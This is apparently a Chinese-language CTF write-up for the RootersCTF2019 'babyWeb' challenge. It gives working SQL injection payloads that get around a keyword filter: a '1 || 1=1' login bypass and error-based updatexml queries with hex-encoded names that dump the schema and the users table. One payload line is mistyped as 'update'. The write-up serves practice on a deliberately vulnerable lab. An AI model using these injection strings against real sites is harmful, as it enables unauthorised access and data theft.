---
title: '[RootersCTF2019]babyWeb'
date: 2024-08-25 19:52:19
tags: 
     - 题解
     - sql注入
categories: 刷题笔记
---

### [RootersCTF2019]babyWeb

![image-20240825195614654](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251956800.png)

看页面提示是个sql注入，提示过滤了union`、`sleep`、`'`、`"`、`or`、`-`、`benchmark

我们先测试字段数，当字段为2时，页面正常回显，为3是则发生报错

```
1 order by 2
1 order by 3
```

<!--more-->

### 非预期

我们使用万能密码登录

```
1 || 1=1 limit 0,1
```

![image-20240825195829817](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408251958897.png)

预期解

我们先爆库，由于引号被过滤了，我们用16进制代替

```
1 || update(1,0x3a,1)
```

![image-20240825200146973](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252001044.png)

接下来就慢慢构造

```
爆库：sql_injection
1||(updatexml(1,concat(0x3a,(select SCHEMA_NAME from information_schema.schemata limit 3,1)),1))#

爆表：users
1||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#

列字段：USER CURRENT_CONNECTIONS TOTAL_CONNECTIONS user uniqueid
1||(updatexml(1,concat(0x3a,(select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1)),1))#

取值：
1||(updatexml(1,concat(0x3a,(select uniqueid from sql_injection.users limit 0,1)),1))#
```

最后在`sql_injection.users`的`uniqueid`字段里找到一串数字

![image-20240825200539486](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408252005518.png)

我们在主页输入得到flag

